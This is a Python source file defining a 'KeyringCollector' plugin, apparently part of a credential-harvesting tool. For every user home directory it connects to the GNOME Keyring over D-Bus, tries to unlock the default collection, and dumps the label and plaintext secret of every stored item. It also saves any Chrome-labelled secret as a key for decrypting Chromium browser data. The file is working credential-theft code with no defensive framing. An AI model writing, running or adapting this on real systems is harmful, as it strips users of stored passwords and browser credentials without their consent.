"""GNOME Keyring decryption. Tries to unlock the login/default collection and
dump every stored item. Uses python3-secretstorage (secretstorage)."""
from __future__ import annotations

import os
from typing import List

from core.secret import Secret, Status
from core.tools import home_dirs, user_of_home, exists
from .base import BaseCollector


class KeyringCollector(BaseCollector):
    name = "Keyring"
    description = "GNOME Keyring (login + default collections) – decrypt with empty/login pw"

    def collect(self) -> List[Secret]:
        out: List[Secret] = []
        try:
            import secretstorage  # noqa: F401
        except Exception:
            return out

        for h in home_dirs():
            kr = os.path.join(h, ".local/share/keyrings")
            if not exists(kr):
                continue
            user = user_of_home(h)
            try:
                conn = secretstorage.dbus_init()
                coll = secretstorage.get_default_collection(conn)
                if coll.is_locked():
                    try:
                        coll.unlock()
                    except Exception:
                        pass
                for item in coll.get_all_items():
                    try:
                        label = item.get_label()
                        secret = item.get_secret().decode("utf-8", "ignore")
                        out.append(Secret("Keyring", user, secret, Status.DECRYPTED,
                                          target=label, secret_type="keyring-item",
                                          notes="GNOME Keyring item"))
                        if label and "Chrome" in label and isinstance(self.opts, dict):
                            self.opts["chromium_key"] = secret.encode()
                    except Exception:
                        continue
            except Exception:
                out.append(Secret("Keyring", user, kr, Status.INFO, target=kr,
                                  secret_type="keyring",
                                  notes="Keyring present; unlock failed (no D-Bus session?)"))
        return out
